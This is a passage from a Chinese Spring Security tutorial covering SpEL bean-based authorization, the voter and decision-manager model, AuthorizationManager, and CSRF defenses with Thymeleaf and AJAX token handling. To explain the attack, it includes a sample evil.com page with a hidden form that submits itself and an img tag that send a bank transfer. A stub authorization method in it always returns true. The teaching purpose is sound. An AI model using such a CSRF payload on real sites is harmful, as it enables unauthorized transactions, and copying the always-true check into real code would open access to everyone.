class="line">    </span><br><span class="line">    <span class="comment">// 更复杂的逻辑，例如检查用户是否在某个项目团队中</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isInProjectTeam</span><span class="params">(Authentication authentication, Long projectId)</span> &#123;</span><br><span class="line">        <span class="comment">// ... 查询数据库，判断用户是否是项目成员 ...</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-在-SpEL-中调用-Bean-的方法"><a href="#2-在-SpEL-中调用-Bean-的方法" class="headerlink" title="2. 在 SpEL 中调用 Bean 的方法"></a>2. 在 SpEL 中调用 Bean 的方法</h5><p><strong>语法</strong>：通过 <code>@beanName.methodName(arguments)</code> 的形式调用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调用 securityService Bean 的 isPostOwner 方法</span></span><br><span class="line"><span class="comment">// 将当前的 authentication 对象和方法的 postId 参数传递过去</span></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;@securityService.isPostOwner(authentication, #postId)&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">editPost</span><span class="params">(Long postId, String content)</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;@securityService.isInProjectTeam(authentication, #projectId)&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ProjectDashboard <span class="title function_">getProjectDashboard</span><span class="params">(Long projectId)</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<p><strong>这种方法的巨大优势</strong>:</p>
<ul>
<li><strong>关注点分离</strong>: 将复杂的授权逻辑从业务方法的注解中抽离出来，放到了专门的 <code>SecurityService</code> 中，使得业务代码更干净。</li>
<li><strong>可重用性</strong>: <code>isPostOwner</code> 这样的方法可以在多个需要此项检查的地方被重复调用。</li>
<li><strong>可测试性</strong>: <code>SecurityService</code> 是一个普通的 Spring Bean，可以像其他 Service 一样被轻松地进行单元测试。</li>
<li><strong>无限扩展</strong>: 你可以在这个 Bean 中注入任何其他服务（如 <code>UserRepository</code>, <code>ProjectRepository</code>），编写任意复杂的 Java 代码来实现你的授权判断，而不仅仅局限于 SpEL 的语法。</li>
</ul>
<hr>
<h3 id="3-5-访问控制决策者（高级）"><a href="#3-5-访问控制决策者（高级）" class="headerlink" title="3.5 访问控制决策者（高级）"></a>3.5 访问控制决策者（高级）</h3><p>在我们通过 <code>.authorizeHttpRequests()</code> 或 <code>@PreAuthorize</code> 声明授权规则时，这些高级的配置最终会被 Spring Security 翻译成底层的决策逻辑。在传统的 Spring Security 架构中，这个决策过程的核心就是 <code>AccessDecisionManager</code> 和 <code>AccessDecisionVoter</code>。</p>
<h4 id="3-5-1-核心概念：投票决策模型"><a href="#3-5-1-核心概念：投票决策模型" class="headerlink" title="3.5.1 核心概念：投票决策模型"></a>3.5.1 核心概念：投票决策模型</h4><p>想象一下一个议会正在对一项法案进行投票。</p>
<ul>
<li><strong>法案</strong>: 相当于一个访问请求，例如“用户 Bob 想要访问 <code>/admin/dashboard</code>”。</li>
<li><strong>议员 (Voter)</strong>: 每个议员都有自己的专长和立场。有的只关心角色，有的只关心IP地址，有的只关心时间。</li>
<li><strong>议长 (Manager)</strong>: 议长不亲自投票，他负责组织投票，并根据议会规则（如“简单多数通过”或“一票否决”）来宣布最终结果。</li>
</ul>
<p>Spring Security 的授权决策机制就是这个模型的完美体现。</p>
<ul>
<li><strong><code>AccessDecisionVoter</code> (投票者)</strong>: 对应“议员”。</li>
<li><strong><code>AccessDecisionManager</code> (决策管理器)</strong>: 对应“议长”。</li>
</ul>
<hr>
<h4 id="3-5-2-AccessDecisionVoter-接口"><a href="#3-5-2-AccessDecisionVoter-接口" class="headerlink" title="3.5.2 AccessDecisionVoter&lt;T&gt; 接口"></a>3.5.2 <code>AccessDecisionVoter&lt;T&gt;</code> 接口</h4><p><code>AccessDecisionVoter</code> 是执行具体投票逻辑的组件。</p>
<p><strong>核心方法</strong>:</p>
<ol>
<li><strong><code>boolean supports(ConfigAttribute attribute)</code></strong>:<ul>
<li>在投票前，<code>AccessDecisionManager</code> 会用这个方法来询问 Voter：“你关心这个类型的权限配置吗？”</li>
<li><code>ConfigAttribute</code> 是对权限规则（如 <code>ROLE_ADMIN</code>）的抽象。</li>
<li>例如，<code>RoleVoter</code> 只会对代表角色的 <code>ConfigAttribute</code> 返回 <code>true</code>。</li>
</ul>
</li>
<li><strong><code>boolean supports(Class&lt;?&gt; clazz)</code></strong>:<ul>
<li>询问 Voter：“你能对这种类型的受保护对象（Secure Object）进行投票吗？”</li>
<li>例如，<code>WebExpressionVoter</code> 会对 <code>Request</code> 对象返回 <code>true</code>，而方法安全的 Voter 会对 <code>MethodInvocation</code> 返回 <code>true</code>。</li>
</ul>
</li>
<li><strong><code>int vote(Authentication authentication, T object, Collection&lt;ConfigAttribute&gt; attributes)</code></strong>:<ul>
<li>这是<strong>核心的投票方法</strong>。如果前面的 <code>supports</code> 方法都返回 <code>true</code>，<code>AccessDecisionManager</code> 就会调用它。</li>
<li><strong>参数</strong>:<ul>
<li><code>authentication</code>: 当前用户的认证信息。</li>
<li><code>object</code>: 正在被访问的受保护对象（如 <code>FilterInvocation</code>，包含了 <code>request</code> 和 <code>response</code>）。</li>
<li><code>attributes</code>: 保护该对象所需的所有权限配置的集合。</li>
</ul>
</li>
<li><strong>返回值 (int)</strong>:<ul>
<li><code>AccessDecisionVoter.ACCESS_GRANTED</code> (1): <strong>赞成</strong>。表示根据我的逻辑，应该允许访问。</li>
<li><code>AccessDecisionVoter.ACCESS_DENIED</code> (-1): <strong>反对</strong>。表示根据我的逻辑，应该拒绝访问。</li>
<li><code>AccessDecisionVoter.ACCESS_ABSTAIN</code> (0): <strong>弃权</strong>。表示这个规则我不关心，让其他 Voter 决定吧。</li>
</ul>
</li>
</ul>
</li>
</ol>
<p><strong>常见的 Voter 实现</strong>:</p>
<ul>
<li><code>RoleVoter</code>: 可能是最简单的 Voter。它检查用户的 <code>GrantedAuthority</code> 是否匹配任何以 <code>ROLE_</code> 前缀开头的 <code>ConfigAttribute</code>。如果匹配，投赞成票；否则弃权。</li>
<li><code>AuthenticatedVoter</code>: 检查用户是否是匿名、通过“记住我”认证，或完全认证，并根据配置（如 <code>IS_AUTHENTICATED_FULLY</code>）进行投票。</li>
<li><code>WebExpressionVoter</code>: <strong>功能最强大的 Voter</strong>。它负责解析和执行 SpEL 表达式（如 <code>hasRole(&#39;ADMIN&#39;) and hasIpAddress(&#39;192.168.1.0/24&#39;)</code>）。</li>
</ul>
<hr>
<h4 id="3-5-3-AccessDecisionManager-接口"><a href="#3-5-3-AccessDecisionManager-接口" class="headerlink" title="3.5.3 AccessDecisionManager 接口"></a>3.5.3 <code>AccessDecisionManager</code> 接口</h4><p><code>AccessDecisionManager</code> 是授权决策的最终裁决者。它管理一个 <code>AccessDecisionVoter</code> 列表，并根据投票结果做出最终决定。</p>
<p><strong>核心方法</strong>:</p>
<ul>
<li><strong><code>void decide(Authentication authentication, Object object, Collection&lt;ConfigAttribute&gt; configAttributes)</code></strong>:<ul>
<li>这是唯一的决策方法。</li>
<li><strong>职责</strong>:<ol>
<li>遍历其管理的 <code>AccessDecisionVoter</code> 列表。</li>
<li>调用每个 Voter 的 <code>vote</code> 方法来收集投票。</li>
<li>根据自己的内部策略，对投票结果进行汇总和裁决。</li>
<li>如果最终决定是<strong>拒绝</strong>，它必须抛出 <code>AccessDeniedException</code>。</li>
<li>如果最终决定是<strong>允许</strong>，它会正常返回，不做任何事情，请求将继续执行。</li>
</ol>
</li>
</ul>
</li>
</ul>
<p><strong>常见的 Manager 实现 (决策策略)</strong>:</p>
<ol>
<li><strong><code>AffirmativeBased</code> (默认策略)</strong><ul>
<li><strong>“一票赞成就通过”</strong>。</li>
<li><strong>逻辑</strong>:<ul>
<li>只要有一个 Voter 投了 <code>ACCESS_GRANTED</code> (赞成票)，就立即做出“允许”的决定，不再询问其他 Voter。</li>
<li>如果没有赞成票，并且 <code>isAllowIfAllAbstainDecisions()</code> 为 <code>false</code>（默认），则抛出 <code>AccessDeniedException</code>。</li>
<li><strong>注意</strong>: <code>AffirmativeBased</code> 不会因为有 <code>ACCESS_DENIED</code> (反对票) 而立即拒绝。它只关心有没有赞成票。</li>
</ul>
</li>
<li><strong>优点</strong>: 灵活。你可以组合多个独立的、可选的授权条件（例如，角色、IP、时间），满足任何一个即可。</li>
</ul>
</li>
<li><strong><code>ConsensusBased</code></strong><ul>
<li><strong>“少数服从多数”</strong>。</li>
<li><strong>逻辑</strong>:<ul>
<li>统计所有非弃权票。</li>
<li>如果赞成票严格多于反对票，则“允许”。</li>
<li>如果反对票多于或等于赞成票，则“拒绝”。</li>
<li>如果全是弃权票，根据 <code>isAllowIfAllAbstainDecisions()</code> 决定。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>UnanimousBased</code></strong><ul>
<li><strong>“一票否决制”</strong>。</li>
<li><strong>逻辑</strong>:<ul>
<li>只要有一个 Voter 投了 <code>ACCESS_DENIED</code> (反对票)，就立即做出“拒绝”的决定。</li>
<li>如果没有反对票，但至少有一个赞成票，则“允许”。</li>
<li>如果全是弃权票，根据 <code>isAllowIfAllAbstainDecisions()</code> 决定。</li>
</ul>
</li>
<li><strong>优点</strong>: 严格。适用于需要满足所有安全条件的场景。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="3-5-4-现代架构的演进-AuthorizationManager"><a href="#3-5-4-现代架构的演进-AuthorizationManager" class="headerlink" title="3.5.4 现代架构的演进 (AuthorizationManager)"></a>3.5.4 现代架构的演进 (<code>AuthorizationManager</code>)</h4><p>随着 Spring Security 的发展，特别是函数式配置风格的引入，<code>AccessDecisionManager</code> 和 <code>AccessDecisionVoter</code> 这套复杂的投票机制被一个更简洁的接口所取代：<strong><code>AuthorizationManager</code></strong>。</p>
<ul>
<li><strong><code>AuthorizationManager&lt;T&gt;</code></strong> 接口只有一个方法: <code>AuthorizationDecision check(Supplier&lt;Authentication&gt; authentication, T object)</code>。</li>
<li>它不再有“投票”和“弃权”的概念，而是直接返回一个 <code>AuthorizationDecision</code> 对象，该对象包含一个布尔值（<code>isGranted()</code>）。如果决策是拒绝，<code>AuthorizationManager</code> 的实现通常会直接抛出 <code>AccessDeniedException</code>。</li>
</ul>
<p><strong>关系</strong>:</p>
<p>你可以将 <code>AuthorizationManager</code> 看作是 <code>AccessDecisionManager</code> 和 <code>AccessDecisionVoter</code> 的<strong>结合体和简化版</strong>。我们通过 <code>.authorizeHttpRequests()</code> 提供的 Lambda 表达式，实际上是在动态地构建和组合各种 <code>AuthorizationManager</code> 的实现。</p>
<p>例如，<code>.hasRole(&quot;ADMIN&quot;)</code> 内部会创建一个 <code>AuthorityAuthorizationManager</code> 的实例。</p>
<p><strong>为什么还要了解旧模型？</strong></p>
<ol>
<li><strong>理解历史和设计哲学</strong>: 投票模型是 Spring Security 设计哲学的核心，理解它有助于你更深入地理解框架的行为。</li>
<li><strong>维护老项目</strong>: 大量现存的 Spring Security 项目仍然在使用基于 XML 或 <code>WebSecurityConfigurerAdapter</code> 的配置，这些配置底层就是 <code>AccessDecisionManager</code>。</li>
<li><strong>深度定制</strong>: 如果你需要实现非常独特的、标准 <code>AuthorizationManager</code> 无法满足的授权逻辑，你可能需要自定义 <code>AccessDecisionVoter</code> 和 <code>AccessDecisionManager</code>，并将它们集成到安全配置中。</li>
</ol>
<hr>
<h2 id="4-Web-安全与高级配置"><a href="#4-Web-安全与高级配置" class="headerlink" title="4. Web 安全与高级配置"></a>4. Web 安全与高级配置</h2><h3 id="4-1-CSRF-跨站请求伪造-防护"><a href="#4-1-CSRF-跨站请求伪造-防护" class="headerlink" title="4.1 CSRF (跨站请求伪造) 防护"></a>4.1 CSRF (跨站请求伪造) 防护</h3><p>CSRF (Cross-Site Request Forgery) 是一种常见的、极具欺骗性的网络攻击方式。攻击者通过诱导受害者在一个已登录的网站上执行非本意的操作，从而达到恶意目的。Spring Security 默认开启了强大的 CSRF 防护机制来应对这种威胁。</p>
<h4 id="4-1-1-CSRF-攻击原理"><a href="#4-1-1-CSRF-攻击原理" class="headerlink" title="4.1.1 CSRF 攻击原理"></a>4.1.1 CSRF 攻击原理</h4><p>要理解 CSRF 防护，首先必须明白攻击是如何发生的。</p>
<p><strong>攻击场景</strong>:</p>
<ol>
<li><p><strong>用户登录可信网站</strong>: 用户 Bob 登录了他的网上银行网站 <code>bank.com</code>，并且没有退出。<code>bank.com</code> 将 Bob 的会话信息（Session ID）存储在了浏览器的 Cookie 中。</p>
</li>
<li><p><strong>用户访问恶意网站</strong>: 之后，Bob 浏览了一个恶意网站 <code>evil.com</code>。这个网站的页面上可能包含一个隐藏的表单或一个诱导性的图片链接，其目标指向 <code>bank.com</code> 的一个敏感操作，比如转账。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 恶意网站 evil.com 的页面内容 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>超值优惠，点击领取！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 方式一：一个自动提交的隐藏表单 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;csrf-form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;https://bank.com/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;toAccount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Mallory-Account-ID&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;csrf-form&#x27;</span>).<span class="title function_">submit</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 方式二：一个看似无害的图片 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://bank.com/transfer?toAccount=Mallory-Account-ID&amp;amount=1000&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p><em>(注: GET 请求虽然不规范，但也能触发某些不安全的敏感操作)</em></p>
</li>
<li><p><strong>浏览器自动携带 Cookie</strong>: 当 Bob 的浏览器加载 <code>evil.com</code> 的页面时，它会解析到这个表单或图片，并向 <code>bank.com/transfer</code> 发起一个请求。根据浏览器的同源策略，<strong>在跨域请求时，浏览器会自动携带目标域 (<code>bank.com</code>) 的 Cookie</strong>。</p>
</li>
<li><p><strong>攻击成功</strong>: <code>bank.com</code> 的服务器收到了这个转账请求。它检查请求中的 Cookie，发现是 Bob 的有效会话，于是认为这是 Bob 本人发起的合法操作，便执行了转账。Bob 在毫不知情的情况下，钱就被转走了。</p>
</li>
</ol>
<p><strong>攻击的核心</strong>: <strong>攻击者利用了浏览器会自动携带 Cookie 的特性，并借助用户的登录状态，伪造了用户的请求。</strong> 服务器无法分辨这个请求是用户在 <code>bank.com</code> 官网上点击按钮触发的，还是在 <code>evil.com</code> 上被动触发的。</p>
<hr>
<h4 id="4-1-2-Spring-Security-的-CSRF-防护机制：同步器令牌模式-Synchronizer-Token-Pattern"><a href="#4-1-2-Spring-Security-的-CSRF-防护机制：同步器令牌模式-Synchronizer-Token-Pattern" class="headerlink" title="4.1.2 Spring Security 的 CSRF 防护机制：同步器令牌模式 (Synchronizer Token Pattern)"></a>4.1.2 Spring Security 的 CSRF 防护机制：同步器令牌模式 (Synchronizer Token Pattern)</h4><p>Spring Security 采用业界标准的<strong>同步器令牌模式</strong>来防御 CSRF 攻击。</p>
<p><strong>工作原理</strong>:</p>
<ol>
<li><strong>服务器生成 Token</strong>: 当用户访问网站时（特别是访问包含表单的页面），服务器会生成一个随机的、不可预测的字符串，称为 <strong>CSRF Token</strong>。</li>
<li><strong>Token 双重分发</strong>:<ul>
<li><strong>一份存储在服务器端</strong>: 这个 Token 会被存储在用户的 <code>HttpSession</code> 中。</li>
<li><strong>一份发送给客户端</strong>: 这个 Token 会被放入页面的某个地方，通常是一个隐藏的表单字段。</li>
</ul>
</li>
<li><strong>客户端提交 Token</strong>: 当用户提交表单时，这个隐藏字段中的 CSRF Token 会作为请求参数，随同其他数据一起发送回服务器。</li>
<li><strong>服务器端验证</strong>: 服务器收到请求后，会执行以下比较：<ul>
<li>从请求参数中获取客户端提交的 Token。</li>
<li>从当前用户的 <code>HttpSession</code> 中获取服务器端存储的 Token。</li>
<li><strong>比较两者是否完全一致</strong>。</li>
</ul>
</li>
<li><strong>决策</strong>:<ul>
<li><strong>如果一致</strong>: 说明请求确实是由网站自己的页面发起的，是合法请求，予以处理。</li>
<li><strong>如果不一致或请求中没有 Token</strong>: 说明这很可能是一个伪造的请求（因为恶意网站 <code>evil.com</code> 无法获取到这个随机 Token），服务器会拒绝该请求，通常返回 <strong>403 Forbidden</strong>。</li>
</ul>
</li>
</ol>
<p>这个机制之所以有效，是因为攻击者所在的恶意网站 <code>evil.com</code> 受到浏览器同源策略的限制，无法通过脚本读取到 <code>bank.com</code> 页面内容或 Cookie 中精确的 Token 值，因此无法在伪造的请求中包含正确的 Token。</p>
<hr>
<h4 id="4-1-3-Spring-Security-的-CsrfFilter-与-CsrfToken"><a href="#4-1-3-Spring-Security-的-CsrfFilter-与-CsrfToken" class="headerlink" title="4.1.3 Spring Security 的 CsrfFilter 与 CsrfToken"></a>4.1.3 Spring Security 的 <code>CsrfFilter</code> 与 <code>CsrfToken</code></h4><ul>
<li><strong><code>CsrfFilter</code></strong>:<ul>
<li>这是 Spring Security 过滤器链中负责 CSRF 防护的核心组件。</li>
<li>它在 <code>UsernamePasswordAuthenticationFilter</code> 等执行实际操作的过滤器之前运行。</li>
<li><strong>职责</strong>:<ul>
<li>对所有“不安全”的 HTTP 方法（如 <code>POST</code>, <code>PUT</code>, <code>DELETE</code>, <code>PATCH</code>）进行拦截。它默认会放行 <code>GET</code>, <code>HEAD</code>, <code>TRACE</code>, <code>OPTIONS</code> 请求，因为这些方法被认为是幂等的，不应改变服务器状态。</li>
<li>执行上述的 Token 比较逻辑。如果验证失败，它会立即中断请求链，并抛出 <code>InvalidCsrfTokenException</code> 或 <code>MissingCsrfTokenException</code>。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>CsrfToken</code></strong>:<ul>
<li>这是一个接口，代表了 CSRF Token 本身。它包含了三个关键信息：<ul>
<li><code>getToken()</code>: 获取 Token 的字符串值。</li>
<li><code>getHeaderName()</code>: 获取期望在 HTTP Header 中传递 Token 时使用的 Header 名称（默认为 <code>X-CSRF-TOKEN</code>）。</li>
<li><code>getParameterName()</code>: 获取期望在请求参数中传递 Token 时使用的参数名称（默认为 <code>_csrf</code>）。</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h4 id="4-1-4-与前端的集成"><a href="#4-1-4-与前端的集成" class="headerlink" title="4.1.4 与前端的集成"></a>4.1.4 与前端的集成</h4><p>为了让 CSRF 防护正常工作，前端必须正确地获取并提交 CSRF Token。</p>
<h5 id="1-Thymeleaf-服务器端渲染"><a href="#1-Thymeleaf-服务器端渲染" class="headerlink" title="1. Thymeleaf (服务器端渲染)"></a>1. Thymeleaf (服务器端渲染)</h5><p>Thymeleaf 对 Spring Security 的 CSRF 提供了无缝的、自动化的集成。</p>
<ul>
<li><p><strong>表单集成</strong>:<br>只要你在 <code>form</code> 标签上使用了 <code>th:action</code>，并且你的应用启用了 CSRF 防护，Thymeleaf 会<strong>自动</strong>在生成的 HTML 表单中添加一个隐藏字段：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">&quot;@&#123;/process&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ... other inputs ... --&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 下面这行是由 Thymeleaf 自动生成的 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>你几乎不需要做任何额外的工作，这是最简单、最推荐的方式。</p>
</li>
<li><p><strong>Meta 标签集成 (用于 AJAX)</strong>:<br>为了方便在 JavaScript 中使用 Token，可以在页面的 <code>&lt;head&gt;</code> 部分添加 meta 标签：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;_csrf&quot;</span> <span class="attr">th:content</span>=<span class="string">&quot;$&#123;_csrf.token&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;_csrf_header&quot;</span> <span class="attr">th:content</span>=<span class="string">&quot;$&#123;_csrf.headerName&#125;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样，JavaScript 就可以轻松地读取这些 meta 标签来获取 Token 和 Header 名称。</p>
</li>
</ul>
<hr>
<h5 id="2-AJAX-前后端分离"><a href="#2-AJAX-前后端分离" class="headerlink" title="2. AJAX (前后端分离)"></a>2. AJAX (前后端分离)</h5><p>对于使用 JavaScript（如 Fetch API, Axios）发起的 AJAX 请求，你需要手动将 CSRF Token 添加到请求中。有两种标准方式：</p>
<p><strong>a. 作为请求参数 (Request Parameter)</strong></p>
<p>适用于 <code>application/x-www-form-urlencoded</code> 类型的请求。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设已通过 meta 标签获取</span></span><br><span class="line"><span class="keyword">const</span> token = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;meta[name=&quot;_csrf&quot;]&#x27;</span>).<span class="title function_">getAttribute</span>(<span class="string">&#x27;content&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>();</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;field1&#x27;</span>, <span class="string">&#x27;value1&#x27;</span>);</span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&#x27;_csrf&#x27;</span>, token); <span class="comment">// 将 token 作为参数添加</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/data&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">body</span>: formData</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><strong>b. 作为请求头 (Request Header) - 推荐方式</strong></p>
<p>这是更现代、更通用的方式，尤其适用于发送 JSON 数据的请求 (<code>application/json</code>)。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设已通过 meta 标签获取</span></span><br><span class="line"><span class="keyword">const</span> token = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;meta[name=&quot;_csrf&quot;]&#x27;</span>).<span class="title function_">getAttribute</span>(<span class="string">&#x27;content&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> headerName = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;meta[name=&quot;_csrf_header&quot;]&#x27;</span>).<span class="title function_">getAttribute</span>(<span class="string">&#x27;content&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 Axios 的示例</span></span><br><span class="line">axios.<span class="title function_">post</span>(<span class="string">&#x27;/api/data&#x27;</span>, </span><br><span class="line">    &#123; <span class="attr">key</span>: <span class="string">&#x27;value&#x27;</span> &#125;, </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">            [headerName]: token <span class="comment">// 将 token 放入指定的 header</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 Fetch API 的示例</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/data&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">        [headerName]: token</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">key</span>: <span class="string">&#x27;value&#x27;</span> &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><strong>全局配置 (如 Axios Interceptors)</strong></p>
<p>在实际项目中，最好的做法是配置一个全局的请求拦截器，自动为所有不安全的请求添加 CSRF Token Header，而无需在每个请求中手动添加。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Axios 拦截器示例</span></span><br><span class="line">axios.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(<span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;meta[name=&quot;_csrf&quot;]&#x27;</span>).<span class="title function_">getAttribute</span>(<span class="string">&#x27;content&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> headerName = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;meta[name=&quot;_csrf_header&quot;]&#x27;</span>).<span class="title function_">getAttribute</span>(<span class="string">&#x27;content&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (token &amp;&amp; headerName) &#123;</span><br><span class="line">        config.<span class="property">headers</span>[headerName] = token;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> config;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><strong>禁用 CSRF</strong></p>
<p>在某些特定场景下（例如，你正在构建一个无状态的、基于 Token 认证的 REST API，并且不使用 Cookie 进行会话管理），你可能需要禁用 CSRF 防护。</p>
